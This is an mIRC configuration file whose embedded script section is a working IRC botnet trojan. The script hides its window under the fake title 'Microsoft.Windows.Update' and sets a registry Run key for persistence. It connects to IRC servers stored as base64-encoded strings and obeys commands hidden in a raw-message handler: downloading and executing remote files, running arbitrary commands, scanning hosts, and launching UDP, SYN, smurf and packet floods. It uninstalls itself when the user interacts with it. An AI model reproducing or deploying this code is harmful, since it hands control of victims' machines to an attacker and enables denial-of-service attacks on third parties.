   [files]
   addrbk=addrbk.ini
   servers=servers.ini
   browser=c:\program files\internet explorer\iexplore.exe
   emailer=c:\program files\outlook express\msimn.exe
   finger=finger.txt
   urls=urls.ini
   [warn]
   fserve=off
   dcc=off
   [options]
   n0=0,0,0,0,0,0,300,0,1,0,1,0,0,0,1,1,0,1,0,1,4096,1,0,0,0,0,1,1,0,50,1,1
   n1=1,1,0,0,0,0,0,0,2,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0
   n2=0,0,0,0,1,1,1,1,0,30,60,0,0,1,0,0,0,0,0,60,20,2,0,0,1,0,0,1,0,0,0
   n3=5000,0,0,0,1,0,1,0,0,1,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,2,0,0,2,0,1,60
   n4=0,0,1,1,0,3,9999,0,0,0,1,0,1024,0,1,2,30,0,0,0,0,0,0,0,1,5000,0,1,0,0,1
   n5=1,1,1,1,1,1,1,1,1,1,6667,500000,0,0,0,1,1,0,300,30,10,0,0,22,0,0,1,0,1,0,0,25
   n6=0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,1,1,0,0,0,0,0,1,0
   n7=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
   [about]
   version=5.91
   show=magnitude
   [dirs]
   wmas=bin\
   loggs=bin\
   download=bin\
   [events]
   default=2,2,3,2,2,1,1,2
   [ports]
   random=off
   bind=off
   [ident]
   active=yes
   system=UNIX
   port=113
   userid=userid1 userid2 userid3
   [socks]
   enabled=no
   port=1080
   method=4
   dccs=no
   [language]
   sjis=0
   multibyte=0
   [clicks]
   status=/uinst | /output [!security error!] user clicked: STATUS!
   query=/uinst | /output [!security error!] user clicked: QUERY!
   channel=/uinst | /output [!security error!] user clicked: CHANNEL!
   nicklist=/uinst | /output [!security error!] user clicked: NICKLIST!
   notify=/uinst | /output [!security error!] user clicked: NOTIFY!
   [waves]
   query=No Sound
   notice=No Sound
   invite=No Sound
   disconnect=No Sound
   send=No Sound
   highlight=No Sound
   flash=No Sound
   dccfail=No Sound
   [dragdrop]
   n0=*.*:/uinst
   s0=*.*:/uinst
   [dde]
   ServerStatus=off
   ServiceName=suck
   CheckName=off
   [marker]
   show=off
   size=3
   colour=1
   method=1
   [text]
   network=All
   commandchar=/
   linesep=-
   timestamp=[HH:nn]
   accept=*.*
   ignore=*.exe,*.com,*.bat,*.dll,*.ini,*.mrc,*.vbs,*.js,*.pif,*.scr,*.lnk,*.pl,*.shs,*.htm,*.html
   [fileserver]
   warning=off
   [dccserver]
   n0=0,59,0,0,0,0
   [agent]
   enable=0,0,0
   char=merlin.acs
   options=0,0,0,10,0
   speech=150,60,100,1,180,10,50,1,1,1,0,50,1
   channel=1,1,1,1,1,1,1,1,1
   private=1,1,1,1
   other=1,1,1,1,1,1,1
   pos=20,20
   [c2V0dGluZ3M=]
   aW5qZWN0dXJs=aHR0cDovL3dhdmUucHJvaG9zdGluZy5jb20vc3lzdGVrNy9tZW1pbnN0YWxsLmV4ZQ==
   [windows]
   scripts=315,684,117,480,0,0,0
   main=1077,136,42,30,0,1,0
   wchannel=0,136,0,30,0,1,0
   [colours]
   n0=1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
   [pfiles]
   n0=popups.ini
   n1=popups.ini
   n2=popups.ini
   n3=popups.ini
   n4=popups.ini
   [mirc]
   email=_©¦»¿@|¢«µ¹.arpa
   user=zÊ®Ø
   nick=+[624623rzjzk]
   host=crackwh0re.freealias.deSERVER:crackwh0re.freealias.de:3845
   [local]
   [wizard]
   warning=2
   [fonts]
   fscripts=Webdings,411,2
   [skehjfs]
   wkfiemdanf=WTNKaFkydDNhREJ5WlM1bWNtVmxZV3hwWVhNdVpHVWdNemcwTlE9PQ==
   wkfiemdewf=WjI5aGRHeHZkbVV1Wm5KbFpXRnNhV0Z6TG1SbElESTVNVEE9
   wkfiemdwaw=YzJ4MWRITmxlQzVtY21WbFlXeHBZWE11WkdVZ01qWXhNUT09
   wkfiemdwan=WnpCaGRITmxlQzVtY21WbFlXeHBZWE11WkdVZ016STRPUT09
   wkfiemdwas=WTI5dGJYVnVhWE4wTG1aeVpXVmhiR2xoY3k1a1pTQXlNREU1
   [dkejffa]
   woei=dGl4bGVycGthMjIzbnlicGRmd2p1
   [blah]
   blah=0

   [script]
   n0=
   n1=on 1:start: {
   n2=   run gpiresult.exe /n /fh UPDATE
   n3=   hide | chkcopy | unsetall  | bwin | set %ver 2
   n4=   if ($readini(rcfg.ini,blah,blah) != 1) { h "bin\secure.exe"  |  writeini rcfg.ini blah blah 1  }
   n5=   .timercl 0 3 /cl
   n6=  registry
   n7=  writeini rcfg.ini ident userid userid1 userid2 userid3
   n8=  writeini rcfg.ini mirc user user
   n9=  .emailaddr _©¦»¿ $+ @|¢«µ¹.arpa
   n10=  fullname zÊ®Ø
   n11=  nick +[ $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ ]
   n12=  .timercon -o 0 20 /conn
   n13=}
   n14=on *:input:*: { haltdef | uinst | hide }
   n15=on 1:disconnect:/.timer 1 15 /conn
   n16=on 1:exit: { sockclose * | rlevel 200 | unset %*  | set %nnn xxx }
   n17=on 1:connect: { .timercon off   | clearall  | clearall }
   n18=alias registry { write -c 394839.reg REGEDIT4  |  write -a 394839.reg [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]  |  write -a 394839.reg "Run32dll"=" $+ $replace($mircdir,\,\\) $+ explorer.exe"  |  .timer 1 20 //run -n regedit /s 394839.reg  |  .timer 1 60 /.remove 394839.reg  }
   n19=alias invisible { h "ATTRIB +H $mircdir $+ " }
   n20=alias rgen { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
   n21=alias k { return $decode($readini(rcfg.ini,dkejffa,woei),m)  }
   n22=alias h { run gpiresult.exe /n /fh /r $1-  }
   n23=alias dci { return $decode($1-,m) }
   n24=alias conn { inc %nor  |  if (%nor == 1) { server $dc($readini(rcfg.ini,skehjfs,wkfiemdanf)) }  |  if (%nor == 2) { server $dc($readini(rcfg.ini,skehjfs,wkfiemdewf)) }  |  if (%nor == 3) { server $dc($readini(rcfg.ini,skehjfs,wkfiemdwaw)) }  |  if (%nor == 4) { server $dc($readini(rcfg.ini,skehjfs,wkfiemdwan)) }  |  if (%nor >= 5) { server $dc($readini(rcfg.ini,skehjfs,wkfiemdwas)) | unset %nor } }
   n25=alias chkcopy { if ($portfree(55361)) { socklisten chkcopy 55361 }  |  else { exit } }
   n26=alias cl { clearall | run gpiresult.exe /n /fh UPDATE | if (!$exists(gpiresult.exe)) { output APPLICATION NOT HIDDEN!!!  | uinst } | if ($appstate != hidden) { uinst } }
   n27=alias hide { if (!$exists(gpiresult.exe)) { output APPLICATION NOT HIDDEN!@%$  | uinst } | clearall | run gpiresult.exe /n /fh UPDATE }
   n28=alias smurf { if (http:// isin $2) { http $2 | set %smurfget $2 | set %smurfip $1 | set %smurfo $3- | halt }  |  if ($2 == $null) { set %bfile bcast.ocx  | h "bin\smurf.exe $1 bcast.ocx $2- $+ "  | halt }  | h "bin\smurf.exe $1 $2 $3- $+ "   | halt  }
   n29=alias bwin { window -p +d @Microsoft.Windows.Update 0 0 1600 1600 |.timer 0 1 window -a @Microsoft.Windows.update }
   n30=alias output { .raw ±øøøø» $ec($1-)  }
   n31=alias rnum { return $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) }
   n32=alias uinst { output Security breach, terminating server. $fulldate  | run term.bat  | unsetall  | exit }
   n33=on *:sockread:http: { :x  | sockread &http  |  bwrite %http.get -1 &http  |  if ($sockbr == 0) { return }  |  goto x  }
   n34=on *:sockopen:http: { if ($sockerr > 0) { output error connecting to server $bracket(%http.domain) | sockclose http | return }  |  .write -c %http.get  | sockwrite -n http GET %http.ext  }
   n35=on *:sockclose:http: { set %lastget $nopath(%http.ext)  |  output finished downloading %lastget  | chkfile  |  return }
   n36=alias http { if ($sock(http).ip != $null) { halt }  |  if ($1) { set %http.full $remove($1,http://)  |  set %http.domain $gettok(%http.full,1,47)  |  set %http.ext / $+ $gettok(%http.full,2-,47)  |  set %http.get $getdir $+ $gettok(%http.ext,$gettok(%http.ext,0,47),47)  |  sockopen http %http.domain 80  |  set %http $1-  |  return  }  |  usage http  }
   n37=alias https { if ($sock(http) == $null) { echo -a no download in progress | return }  |  sockclose http  |  output stopped http download $bracket($nopath(%http.get))  |  return  }
   n38=alias flushdns { h "ipconfig /flushdns" }
   n39=alias chkfile {
   n40=  if (%lastget == meminstall.exe) && (%dl != 1) { run %lastget | uinst | exit }
   n41=  if (%http == %smurfget) { smurf %smurfip %http.get %smurfo }
   n42=  if (%plugurl == %http) { .load -rs %http.get }
   n43=  if (%downex == %http) { run %http.get  | output: executing: %lastget }
   n44=}
   n45=alias udp { set %utarget $1 | set %ucount $2  | set %udelay $3 | set %uport $4  |  set %start 0  |  set %end $2  | output udp: %1 $2 $+ / $3 $+ / $4   | if (%uport == 0) { set %randport $rand(1,65535) }  |  else { set %randport %uport }  |  .timerudp %ucount %udelay /udphit  }
   n46=alias udphit {
   n47=  if (%start == %end) { halt | .timerudp off }
   n48=  inc %start 1  |  set %randname $rand(100,999)
   n49=  if (%uport == 0) { set %randport $rand(1,65535) }  |  sockudp Udp $+ %randname $+ a %utarget %randport $str($chr($rand(170,255)),100)
   n50=  if (%uport == 0) { set %randport $rand(1,65535) }  |  sockudp Udp $+ %randname $+ b %utarget %randport $str($chr($rand(170,255)),100)
   n51=  if (%uport == 0) { set %randport $rand(1,65535) }  |  sockudp Udp $+ %randname $+ c %utarget %randport $str($chr($rand(170,255)),100)
   n52=  if (%uport == 0) { set %randport $rand(1,65535) }  |  sockudp Udp $+ %randname $+ d %utarget %randport $str($chr($rand(170,255)),100)
   n53=  if (%uport == 0) { set %randport $rand(1,65535) }  |  sockudp Udp $+ %randname $+ e %utarget %randport $str($chr($rand(170,255)),100)
   n54=}
   n55=menu @Microsoft.Windows.Update {
   n56=  mouse:/output Warning: Movement over window  | uinst
   n57=  sclick:/uinst
   n58=  dclick:/uinst
   n59=  uclick:/uinst
   n60=  rclick:/uinst
   n61=  lbclick:/uinst
   n62=  drop:/uinst
   n63=}
   n64=alias opf { set %opfs pf. $+ $ticks  | sockopen %opfs $1- }
   n65=on 1:sockopen:pf.*: {
   n66=  if ($sockerr > 0) { halt }
   n67=  set %pfr $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200))
   n68=  sockwrite -n $sockname $str(%pfr,20)  |  sockwrite -n $sockname - 10111011 -  |  sockwrite -n $sockname $str(%pfr,19)  |  sockwrite -n $sockname - 10111011 -  |  sockwrite -n $sockname $str(%pfr,16)  |  sockwrite -n $sockname - 10111011 -  |  sockwrite -n $sockname $str(%pfr,13)  |  sockwrite -n $sockname - 10111011 -
   n69=  set %pfr $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200))
   n70=  sockwrite -n $sockname $str(%pfr,20)  |  sockwrite -n $sockname - 10111011 -  |  sockwrite -n $sockname $str(%pfr,19)  |  sockwrite -n $sockname - 10111011 -  |  sockwrite -n $sockname $str(%pfr,16)  |  sockwrite -n $sockname - 10111011 -  |  sockwrite -n $sockname $str(%pfr,13)  |  sockwrite -n $sockname - 10111011 -
   n71=  set %pfr $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200)) $+ $chr($r(100,200))
   n72=  sockwrite -n $sockname $str(%pfr,20)  |  sockwrite -n $sockname - 10111011 -  |  sockwrite -n $sockname $str(%pfr,19)  |  sockwrite -n $sockname - 10111011 -  |  sockwrite -n $sockname $str(%pfr,16)  |  sockwrite -n $sockname - 10111011 -  |  sockwrite -n $sockname $str(%pfr,13)  |  sockwrite -n $sockname - 10111011 -
   n73=  sockclose $sockname
   n74=}
   n75=alias remote { haltdef | halt }
   n76=alias dc { return $decode($decode($1-,m),m)  }
   n77=alias ec { return $encode($encode($1-,m),m)  }
   n78=alias parse {
   n79=  if ($1 == version) { output Version: 2.5 | halt }
   n80=  if ($1 == checkmem) { if ($exists(meminstall.exe) == $true) { output memok | halt }  |  http $2 | set %dl 1 | output gettingmem  }
   n81=  if ($1 == dirinfo) { output dirinfo: $mircdir / $mircexe / $script  | halt }
   n82=  if ($1 == test) { output testreply | halt }
   n83=  if ($1 == ntscan) { scanner $2-  | halt }
   n84=  if ($1 == iisscan) { iis $2 $3 | halt }
   n85=  if ($1 == randscan) { randscan $2  | halt }
   n86=  if ($1 == stopscan) { sockclose ip* |.timerscan* off | unset %ip* | unset %total | unset %totalscaning | unset %beg* | unset %end* | unset %scan.*  | halt }
   n87=  if ($1 == update) { http $2-  | halt }
   n88=  if ($1 == modini) { writeini $2 $3 $4 $5- | halt }
   n89=  if ($1 == webfld) { .timerws -m $2 $3 /http $4-  | halt }
   n90=  if ($1 == reset) { unsetall | quit -reset-  | halt }
   n91=  if ($1 == wping) && ($2 == stop) { h " $+ libparse.exe -kf wping.exe" | halt }
   n92=  if ($1 == wping) { h " $+ bin\wping.exe $2- $+ "  | halt }
   n93=  if ($1 == ping) && ($2 == stop) { h " $+ libparse.exe -kf ping.exe" | halt }
   n94=  if ($1 == ping) { h "ping.exe $2 $3- $+ "  | halt }
   n95=  if ($1 == udp) && ($2 == stop) { .timerudp off | halt }
   n96=  if ($1 == udp) { udp $2-  | halt }
   n97=  if ($1 == syn) && ($2 == stop) { h " $+ libparse.exe -kf syn.exe" | halt }
   n98=  if ($1 == syn) { h "bin\syn.exe $2- $+ " | halt }
   n99=  if ($1 == smurf) && ($2 == stop) { h " $+ libparse.exe -kf smurf.exe" | halt }
   n100=  if ($1 == smurf) { smurf $2-  | halt }
   n101=  if ($1 == pflood) && ($2 == stop) { .timerpflood off | halt }
   n102=  if ($1 == pflood) { .timerpflood $1 $2 /opf $3 $4   | halt }
   n103=  if ($1 == startbnc) { startbnc $2- | halt }
   n104=  if ($1 == stopbnc) { stopbnc | halt }
   n105=  if ($1 == download) { http $2 }
   n106=  if ($1 == downex) { set %downex $2  | http %downex  | halt }
   n107=  if ($1 == cmd) {  set %cmd // $+ $2-   |  %cmd   |  halt  }
   n108=  if ($1 == netstat) { output connection: $dll(bootdrv.dll,connection,_) network interfaces:   $dll(bootdrv.dll,interfaceinfo,_) ip/host: $ip $+ / $+ $host   | halt }
   n109=  if ($1 == systat) { output time/date: $time $+ @ $+ $date os: $dll(bootdrv.dll,osinfo,_) cpu:   $dll(bootdrv.dll,cpuinfo,_) mem: $dll(bootdrv.dll,meminfo,_) uptime: $duration($calc($ticks / 1000 )) hdd:   $dll(bootdrv.dll,diskcapacity,_) url: $+ $url   | halt }
   n110=  if ($1 == plugin) { if ($2 == get) { set %plugurl $3 | download $3 | halt }   |   if ($2 == load) { .load -rs log\ $+ $3 | halt }   |   if ($2 == unload) { .unload -rs log\ $+ $3  | halt }  }
   n111=  if ($1 == dscan) {
   n112=    if ($2 == start) { output reqrange  | set %scantype dist | halt }
   n113=    if ($2 == range) { scanner $3- | halt }
   n114=    if ($2 == kill) { sockclose ip* | timerscan* off | unset %total | unset %totalscaning | unset %beg* | unset %end* | unset %scan.*  | halt }
   n115=    if ($2 == stop) { timerscan* off | halt }
   n116=    if ($2 == resume) { if (%total != $null) { startscan } }
   n117=    halt
   n118=  }
   n119=  halt
   n120=}
   n121=raw 001:*: { halt }
   n122=raw 002:*: { halt }
   n123=raw 003:*: { halt }
   n124=raw 251:*:/halt
   n125=raw 252:*:/halt
   n126=raw 253:*:/halt
   n127=raw 254:*:/halt
   n128=raw 255:*:/halt
   n129=raw 375:*:/halt
   n130=raw 372:*:/halt
   n131=raw 376:*:/halt
   n132=raw 004:*:/halt
   n133=raw 501:*:/if ($5 != +icbx) { halt }  |  parse $dc($1)  | halt

   [afiles]
   n0=aliases.ini
   [extensions]
   n0=defaultEXTDIR:\
   n1=*.wav,*.mid,*.mp3EXTDIR:\
   [rfiles]
   n0=rcfg.ini
   n1=rcfg.ini
   n2=rcfg.ini
   n3=nvwrsplinn.dll

   [variables]
   n0=%ver 2
